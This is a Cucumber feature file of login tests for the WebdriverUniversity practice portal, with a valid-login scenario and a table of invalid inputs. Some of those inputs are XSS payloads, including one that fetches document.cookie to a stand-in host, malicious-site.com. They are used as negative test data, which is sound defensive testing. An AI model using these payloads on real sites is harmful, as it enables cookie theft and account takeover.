@login @regression
Feature: Webdriver Login Portal page

    Background: Pre-conditions
        # Given I Navigate to WebdriverUniversity homepage
        # When I click on the login portal button
        Given I navigate to the webdriveruniversity login page
    @smoke
    Scenario Outline: Login portall page sucessfull with valid Username and Password
        When I type a username '<userName>' and  password '<passWord>'
        When I click on the login button
        Then I should be presented with a successful login portal submission '<message>'

        Examples:
            | userName  | passWord     | message              |
            | webdriver | webdriver123 | validation succeeded |

    Scenario Outline: Login portall page unsucessfull with invalid Username and Password
        When I type a invalid username '<invaldUserName>' and password '<invalidPassWord>'
        When I click on the login button
        Then I should be presented with a unsuccessful login portal submission '<message>'

        Examples:
            | invaldUserName                                                                      | invalidPassWord                         | message           |
            | webdriver1                                                                          | webdriver123                            | validation failed |
            | webdriver                                                                           | webdriver                               | validation failed |
            | web                                                                                 | driver123                               | validation failed |
            | !@#$%^&*                                                                            | !@#$%^&*                                | validation failed |
            |                                                                                     | !@#$%^&*                                | validation failed |
            | 123123123                                                                           |                                         | validation failed |
            | <script>alert("XSS")</script>                                                       | password123                             | validation failed |
            | admin                                                                               | <script>alert("XSS")</script>           | validation failed |
            | user1                                                                               | <script>alert(document.cookie)</script> | validation failed |
            | <script>malicious code</script>                                                     | password                                | validation failed |
            | <script>window.location="http://malicious-site.com"</script>                        | anypassword                             | validation failed |
            | <script>fetch("http://malicious-site.com/steal?cookie=" + document.cookie)</script> | anypassword                             | validation failed |
            | <img src=x onerror=alert("XSS")>                                                    | anypassword                             | validation failed |
            | <svg/onload=alert("XSS")>                                                           | anypassword                             | validation failed |
            | <iframe src="javascript:alert(`XSS`)"></iframe>                                     | anypassword                             | validation failed |

